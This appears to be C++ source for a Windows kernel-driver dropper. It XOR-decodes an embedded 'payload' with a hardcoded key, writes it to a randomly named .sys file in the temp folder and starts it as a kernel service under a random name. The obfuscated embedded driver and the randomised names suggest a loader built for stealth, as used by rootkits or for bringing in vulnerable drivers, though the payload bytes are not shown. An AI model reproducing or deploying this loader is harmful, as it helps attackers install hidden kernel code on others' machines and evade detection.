#include "LoadDriver.h"
#include "sys.h"



BOOLEAN docode(PUCHAR imageData, size_t len) {

    unsigned char key[] = { 0x2e, 0x76, 0x5b, 0x2f };
    size_t keyLen = sizeof(key) / sizeof(key[0]);

    for (int i = 0; i < len; i++) {
        imageData[i] ^= key[i % keyLen];
    }

    return TRUE;
}
char* generateRandomString(size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    size_t charsetSize = sizeof(charset) - 1;

    char* randomString = (char*)malloc(length + 1);
    if (!randomString) {
        return NULL;
    }

    srand((unsigned int)time(NULL));

    for (size_t i = 0; i < length; ++i) {
        randomString[i] = charset[rand() % charsetSize];
    }
    randomString[length] = '\0';

    return randomString;
}
LPCWSTR charToLPCWSTR(char* str) {
    int size_needed = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
    if (size_needed == 0) {
        return NULL;
    }

    wchar_t* wstr = (wchar_t*)malloc(size_needed * sizeof(wchar_t));
    if (wstr == NULL) {
        return NULL;
    }

    MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, size_needed);

    return wstr;
}
BOOLEAN LoadDriver(LPCWSTR driverName, LPCWSTR driverPath) {

    SC_HANDLE ScMgr = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!ScMgr) {
        std::cerr << "OpenSCManager failed: " << GetLastError() << std::endl;
        return FALSE;
    }
    SC_HANDLE hService;
    hService = CreateService(ScMgr, driverName, driverName, SERVICE_START | SERVICE_STOP | DELETE, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL, NULL, NULL);

    if (!hService) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            hService = OpenService(ScMgr, driverName, SERVICE_START | SERVICE_STOP | DELETE);
        }
        else {
            std::cerr << "CreateService failed: " << GetLastError() << std::endl;
            CloseServiceHandle(ScMgr);
            return FALSE;
        }
    }

    BOOLEAN bSuccess = StartService(hService, NULL, NULL);
    if (!bSuccess) {
        std::cerr << "StartService failed: " << GetLastError() << std::endl;

    }
    CloseServiceHandle(hService);
    CloseServiceHandle(ScMgr);

    return TRUE;
}

BOOLEAN UnLoadDriver(LPCWSTR driverName) {
    SC_HANDLE ScMgr = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!ScMgr) {
        std::cerr << "OpenSCManager failed: " << GetLastError() << std::endl;
        return false;
    }
    SC_HANDLE hService = OpenService(ScMgr, driverName, SERVICE_START | SERVICE_STOP | DELETE);
    SERVICE_STATUS serviceStatus = {};
    if (ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        std::cout << "Service stopped successfully." << std::endl;
    }
    else if (GetLastError() != ERROR_SERVICE_NOT_ACTIVE) {
        std::cerr << "ControlService failed: " << GetLastError() << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(ScMgr);
        return false;
    }

    if (!DeleteService(hService)) {
        std::cerr << "DeleteService failed: " << GetLastError() << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(ScMgr);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(ScMgr);
    return true;


}
BOOLEAN installDriver(LPCWSTR driverName, LPCWSTR driverPath) {
    UnLoadDriver(driverName);

    DWORD dwWritten = NULL;
    HANDLE hFile = NULL;

    LPVOID lpMem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(lpMem, payload, sizeof(payload));
    if (docode((PUCHAR)lpMem, sizeof(payload))) {
        hFile = CreateFileW(driverPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (!hFile) {
            return FALSE;
        }


        BOOLEAN bRet = WriteFile(hFile, lpMem, sizeof(payload), &dwWritten, NULL);
        if (!bRet) {
            CloseHandle(hFile);
            return FALSE;

        }
        if (sizeof(payload) != dwWritten) {
            CloseHandle(hFile);
            return FALSE;

        }
    }
    CloseHandle(hFile);


    return LoadDriver(driverName, driverPath);

}
LPCWSTR getRandomSysDir() {
    char tempDir[MAX_PATH] = { 0 };
    char fullPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);
    char* randomFileName = generateRandomString(12);
    snprintf(fullPath, sizeof(fullPath), "%s%s.sys", tempDir, randomFileName);
    return charToLPCWSTR(fullPath);
}
LPCWSTR getRandomSysServiceName() {
    return charToLPCWSTR(generateRandomString(8));
}